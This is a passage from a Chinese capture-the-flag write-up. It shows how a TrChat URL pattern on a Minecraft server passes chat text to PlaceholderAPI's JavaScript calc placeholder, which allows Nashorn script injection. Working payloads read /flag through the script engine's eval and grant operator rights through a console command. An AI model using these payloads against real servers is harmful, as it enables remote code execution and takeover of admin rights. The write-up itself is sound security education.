  - 在 Nashorn 中，脚本通常可以访问 Java 类，例如通过 `Java.type(...)`、反射等。也就是说，如果能控制 `args[0]`，就可能执行任意 Java 方法。
  - 即使有某些 ClassFilter 限制，`eval` 仍然有可能可以执行。

而 `calc.js` 注册成了全局可用的 PAPI 占位符，这意味着任何能解析 PlaceholderAPI 的地方，都可以通过 `%javascript_calc_<参数>%` 调用 `calc.js`

所以现在我们需要找到一个地方会解析 PAPI 的地方，随后我们就可以尝试调用这里的 eval 来实现 RCE。

![](https://img.halfcity.top/2026/11/10/e0cd9a5959b23e5e5042ae155a4ec640.png)

之前发现的 TrChat 的修复似乎都是对这些 yaml 的修复我们一个个去看看。

这里注意到这个文件，在 `function.yaml` 文件中：

```yaml
General:
  Command-Controller:
    Enabled: true
    List:
      - 'arasple{exact: true}{condition: perm *trchat.admin}'
      - 'ver(sion)?(s)?{condition: perm *trchat.admin}'
      - 'help(s)?{condition: perm *trchat.admin}'
      - 'shout{cooldown: 3}'
  Mention:
    Enabled: true
    Self-Mention: false
    Permission: 'none'
    Cooldown: '30s'
    Notify: true
    Actions: [ ]
  Mention-All:
    Enabled: true
    Permission: 'trchat.function.mentionall'
    Cooldown: '5m'
    Notify: true
    Keys:
      - "@all"
      - "@everyone"
      - "@everybody"
      - "@所有人"
      - "@全体成员"
    Actions: [ ]
  Item-Show:
    Enabled: true
    Permission: 'none'
    Cooldown: '30s'
    Origin-Name: false
    Compatible: false
    Type: TRANSLATABLE
    Keys:
      - "%i%"
      - "%i"
      - "%item%"
      - "%item"
      - "[i]"
      - "[item]"
    Actions: [ ]
  Inventory-Show:
    Enabled: true
    Permission: 'trchat.function.inventoryshow'
    Cooldown: '30s'
    Keys:
      - '[inv]'
      - '[inventory]'
    Actions: [ ]
  EnderChest-Show:
    Enabled: true
    Permission: 'trchat.function.enderchestshow'
    Cooldown: '30s'
    Keys:
      - '[ender]'
      - '[enderchest]'
    Actions: [ ]
  Image-Show:
    Enabled: true
    Permission: 'trchat.function.imageshow'
    Cooldown: '1m'
    Key: '!\[([^;]*)\]\(([a-zA-Z]+://[^\s]*)\)'
    Actions: [ ]

Custom:
  # 示例 —— 网站分享
  shareUrl:
    pattern: '((https|http|ftp|rtsp|mms)?:\/\/)[^\s]+'
    display:
      text: '&8[&f&l网站&8]'
      hover:
        - ''
        - '&3网站: {0}'
        - ''
        - '&7点击进入!'
        - ''
        - '&8[&c!&8] &7谨防任何诈骗'
      url: '{0}'

```

注意到这里：

```yaml
  shareUrl:
    pattern: '((https|http|ftp|rtsp|mms)?:\/\/)[^\s]+'
    display:
      text: '&8[&f&l网站&8]'
      hover:
        - ''
        - '&3网站: {0}'
        - ''
        - '&7点击进入!'
        - ''
        - '&8[&c!&8] &7谨防任何诈骗'
      url: '{0}'
```

由于 PAPI 在这里被安装，所以这里会正则匹配协议头并将后面的参数通过 PAPI 解析。

所以这里的参数部分可能就可以调用 calc 来实现任意 js 执行。

我们可以测试一下：

```txt
http://example.com/%javascript_calc_1+1%
```

![](https://img.halfcity.top/2026/11/10/0977ce36343fea036e1ab498f0cf4880.png)

可以看到这里成功调用 PAPI 解析了。

尝试如下 payload 检查 `Java.Type()` 的可用性：

```txt
http://example.com/%javascript_calc_Java.type('java.lang.System').getProperty('java.version')%
```

但是返回如下：

![](https://img.halfcity.top/2026/11/10/dd024f4f0eff49baae39447d54ab8a0a.png)

调用如下 payload 尝试检查 engine 是否可用：

```txt
http://example.com/%javascript_calc_this.engine!=null%
```

![](https://img.halfcity.top/2026/11/10/baf52a5875834d13e272a06dbc8338dc.png)

可以看到，是可以使用的。

那么我们可以尝试直接调用脚本引擎执行 `Files.readAllLines()`，来尝试读取 flag。

```txt
http://example.com/%javascript_calc_this.engine.factory.scriptEngine.eval('java.nio.file.Files.readAllLines(java.nio.file.Paths.get("/flag"))')%
```

![](https://img.halfcity.top/2026/11/10/8502a381f21a30f940a6aa91b367e5f8.png)

可以看到这里没有被 `ClassFilter` 拦截，并得到了最后的 flag：

```txt
flag{pl4ceh0lder_pwn3d_by_ch4t}
```

### 彩蛋

这里由于加载了Bukkit 插件，所以这里的 Player 就是 `org.bukkit.entity.Player` 的实例，因此我们可以直接调用 getter 来访问控制台。

直接给予我们 op 权限，这里由于是 URL 所以会经历一次 URL 解码的过程，所欲可以使用 `%20` 编码来绕过空格。

payload：

```txt
http://example.com/%javascript_calc_Player.getServer().dispatchCommand(Player.getServer().getConsoleSender(),"op%20halfcity")%
```

这样我们就获取到 OP 了：

![](https://img.halfcity.top/2026/11/10/2754745e27a94d8ddea4c7a90aa20b94.png)
